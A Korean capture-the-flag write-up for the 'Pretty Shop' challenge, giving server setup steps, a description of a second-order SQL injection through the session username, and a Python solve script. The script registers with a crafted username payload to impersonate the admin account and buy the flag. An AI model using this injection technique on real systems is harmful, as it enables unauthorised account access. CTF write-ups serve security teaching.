# Pretty Shop (Hackingcamp 18)

```
문제명 : Pretty shop
출제자 : 문시우
난이도 : 하
```

### 문제 셋팅

환경 : `apache2, php7.2.7, sqlite3`

1. apache2 설치하고 mod_rewrite 모듈 로드  
$ sudo rewrite.load ../mods-enabled/

2. apache2.conf에서 .htaccess 인식하도록 설정  
AllowOverride를 None에서 All로 바꿔주면 됨

3. sqlite3 설치 및 php-sqlite3 모듈 활성화
$ sudo apt-get install sqlite3  
$ sudo apt-get install php-sqlite3  
$ /etc/php/7.x/apache2/php.ini 에서 ;extension=php_sqlite3.dll 앞에있는 ; 지우기


### 취약점 개요

Concept : Indirect sql injection in sqlite3

`/classes/Shop.class.php` 에서 취약점 발생  
line 42 : `$user = $this->get_user_information($_SESSION['username']);`  
`get_user_information` 메소드로 `$_SESSION['username']`를 그대로 넘겨주고 있다.


### 풀이 방법

```python
from requests import post
# pretty shop write up

def main() :
	username = "username=-1'/**/and/**/0/**/or/**/username='admi'||'n';--"
	data = {"username": username, "password": "12345"}
	r = post('http://layer7.kr:6005/register', data=data)

	r = post('http://layer7.kr:6005/login', data=data)
	cookies = {'PHPSESSID':r.cookies['PHPSESSID']}

	get_flag = post('http://layer7.kr:6005/buy', data={'item':'flag'}, cookies=cookies)
	print(get_flag.text)

if __name__ == '__main__' :
	main()
```